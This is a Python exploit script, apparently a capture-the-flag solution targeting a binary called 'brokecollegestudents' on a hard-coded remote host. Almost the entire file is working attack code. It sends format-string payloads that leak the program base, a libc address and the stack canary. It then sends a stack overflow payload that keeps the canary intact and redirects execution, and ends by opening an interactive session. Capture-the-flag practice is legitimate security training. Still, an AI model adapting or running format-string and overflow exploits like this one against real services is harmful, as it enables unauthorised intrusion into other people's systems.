#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./brokecollegestudents')

host = args.HOST or '143.198.184.186'
port = int(args.PORT or 5001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
brva 0x16e5
continue
'''.format(**locals())

# -- Exploit goes here --

def choice(option):
    sla(b": ", str(option).encode('utf-8'))

def brute():
    choice(1)
    choice(1)
    choice(1)
    sla(b"name: ", "A||%1$p||%10$p||%9$p||B")
    reu(b"A||")
    leak=reu(b"||B").split(b"||")
    exe.address = int(leak[0], 16)
    info(f"PIE BASE : {hex(exe.address)}")


# 3

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
# for i in range(1,100):
    # io = start()
    # choice(1)
    # choice(1)
    # choice(1)
    # sla(b"name: ", f"A||%{str(i)}$p||%10$p||%9$p||B")
    # reu(b"A||")
    # leak=reu(b"||B").split(b"||")
    # exe.address = int(leak[0], 16)
    # gdb.attach(io.pid, gdbscript=gdbscript)
    # io.interactive()
# R=Rootkit(io)
io=start()
choice(1)
choice(1)
choice(1)
sla(b"name: ", "A||%23$p||%26$p||%9$p||B")
reu(b"A||")
leak=reu(b"||B").split(b"||")
print(leak)
exe.address = int(leak[0], 16) - 0x192d
libc.address = int(leak[1], 16)# - libc.sym['_IO_stdfile_1_lock']
c = int(leak[2], 16)

info(f"PIE BASE : {hex(exe.address)}")
info(f"Libc BASE : {hex(libc.address)}")
info(f"Canary : {hex(c)}")
# gdb.attach(io.pid, gdbscript=gdbscript)
choice(1)
choice(1)
choice(1)
sla(b"name: ", b"A"*24 + p(c) + p(0xdeadbeef) + p(exe.address+0x14f1) )
print(re())
io.interactive()